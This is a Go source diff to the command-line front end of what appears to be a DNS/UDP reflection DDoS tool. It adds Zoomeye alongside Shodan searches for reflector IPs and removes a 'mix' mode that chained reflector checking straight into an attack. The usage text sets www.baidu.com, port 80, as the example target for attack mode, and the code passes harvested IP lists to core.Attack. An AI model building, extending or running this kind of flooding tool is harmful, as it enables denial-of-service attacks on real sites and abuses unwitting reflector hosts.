@@ -31,16 +31,13 @@ func modeWarn() {
 	fmt.Println("[!] Mode must be set !")
 	fmt.Println("[*] c		check ip mode")
 	fmt.Println("[*] a		attack mode")
-	fmt.Println("[*] m		mix mode(select And attack)")
 }
 
 func usage() {
 	fmt.Println(`[*] Check Mode:
 	go run main.go -m c -f test.txt -o output.txt --type
 [*] Atk	Mode:
-	go run main.go -m a -f test.txt -t www.baidu.com -p 80 --type dns
-[*] Mix Mode:
-	go run main.go -m m -f test.txt -t www.baidu.com -p 80 --type dns -o output.txt`)
+	go run main.go -m a -f test.txt -t www.baidu.com -p 80 --type dns`)
 }
 
 // 支持域名，然后解析
@@ -91,20 +88,20 @@ func main() {
 		var iplist []string
 		var err error
 		fmt.Println("[+] Check Mode start")
-		// 1. 判断是否指定输出文件
-		if outputfile == "" {
-			fmt.Println("[-] Please set outputfile")
+		switch {
+		// 1. 判断是否指定输出文件（Required）
+		case outputfile == "":
+			fmt.Println("[-] Please set -o option")
 			usage()
 			return
-		}
-
-		switch {
+		// 2. 判断是否从文件输入
 		case loadfile != "":
 			fmt.Println("[+] Loadfile from " + loadfile)
 			iplist, err = utils.FileLoads(loadfile)
 			if err != nil {
 				return
 			}
+		// 3. 判断是否从IP地址范围输入
 		case iprange != "":
 			if strings.Contains(iprange, "/") {
 				iplist, err = utils.Hosts(iprange)
@@ -120,17 +117,33 @@ func main() {
 				}
 				iplist = []string{iprange}
 			}
+		// 4. 判断是否从api输入
 		case apiquery:
-			fmt.Println("[*] Shodan API Searching")
-			for page := 1; page <= config.ShodanPage; page++ {
-				tmplist, err := api.Shodan(typemap[atktype], uint(page))
-				if err != nil {
-					break
+			switch {
+			case config.ShodanApi != "":
+				fmt.Println("[*] Shodan API Searching")
+				for page := 1; page <= config.ShodanPage; page++ {
+					tmplist, err := api.Shodan(typemap[atktype], uint(page))
+					if err != nil {
+						break
+					}
+					iplist = append(iplist, tmplist...)
 				}
-				iplist = append(iplist, tmplist...)
+				fmt.Println("[+] Shodan API Searching Finished")
+				fallthrough
+			case config.ZoomeyeApi != "":
+				fmt.Println("[*] Zoomeye API Searching")
+				for page := 1; page <= config.ZoomeyePage; page++ {
+					tmplist, err := api.Zoomeye(typemap[atktype], page)
+					if err != nil {
+						break
+					}
+					iplist = append(iplist, tmplist...)
+				}
+				fmt.Println("[+] Zoomeye API Searching Finished")
 			}
-			fmt.Println("[+] Shodan API Searching Finished")
-
+			// 不同的搜索引擎可能会有重复的，这里做个去重操作
+			iplist = utils.RemoveRepeatedElement(iplist)
 		default:
 			fmt.Println("[-] Error Input")
 			return
@@ -167,40 +180,6 @@ func main() {
 			fmt.Println("[-] Attack Error")
 			return
 		}
-	// Mix模式
-	case "m":
-		fmt.Println("[+] Mix Mode")
-		if ipaddress == "" || atktype == "" || loadfile == "" || outputfile == "" {
-			fmt.Println("[!] Please input right value")
-			usage()
-		}
-		if port > 65535 || port <= 0 {
-			fmt.Println("[!] Port in range 1~65535")
-			return
-		}
-
-		fmt.Println("[+] Loadfile from " + loadfile)
-		iplist, err := utils.FileLoads(loadfile)
-		if err != nil {
-			return
-		}
-
-		result, err := core.Check(iplist, atktype, outputfile, interval, srcaddress)
-		if err != nil {
-			fmt.Println("[-] Check FAILED !")
-		}
-
-		atklist := []string{}
-		for index := range result {
-			atklist = append(atklist, index)
-		}
-
-		err = core.Attack(atklist, ipaddress, atktype, port, config.AttackInterval, timeout)
-		if err != nil {
-			fmt.Println("[-] Attack Error")
-			return
-		}
-
 	default:
 		modeWarn()
 	}
